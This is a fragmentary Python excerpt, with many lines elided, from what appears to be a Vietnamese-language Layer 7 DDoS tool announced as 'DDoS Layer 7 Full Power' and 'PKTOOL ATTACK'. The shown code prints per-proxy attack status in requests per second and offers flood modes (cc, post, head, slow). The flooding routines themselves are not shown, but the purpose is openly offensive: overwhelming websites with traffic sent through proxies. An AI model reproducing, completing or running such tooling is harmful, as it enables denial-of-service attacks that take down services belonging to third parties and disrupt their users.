...
def OutputToScreen(ind_rlock):
	...
	while 1:
		if i > 3:
			i = 0
		print("{:^10}".format("Proxies attacking status"))
		print("{:^10}".format("IP:PORT   <->   RPS    "))
		...
		for num in range(top_num):
			...
			if len(ind_dict) != 0:
				...
				rps = ind_dict[top]
				ind_dict[top] = 0
			print("{:^10}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
		total = 0
		for k,v in ind_dict.items():
			total = total + v
			ind_dict[k] = 0
		ind_rlock.release()
		print("{:^10}".format(" ["+sp_char[i]+"] PKTOOL ATTACK | Tổng REQUESTS:"+str(total)))
		i+=1
		time.sleep(1)
		print("\n"*100)
...
def main():
	...
	global brute
	global url
	print("> DDoS Layer 7 Full Power")
	mode = InputOption("> Chọn Chế Độ [mặc định =pktool] :",["cc","post","head","slow","check"],"cc")
	...
	if mode == "slow":
		...
		multiple = str(input("> bí mật mặc định =9000):"))
		if multiple == "":
			multiple = int(9000)
		else:
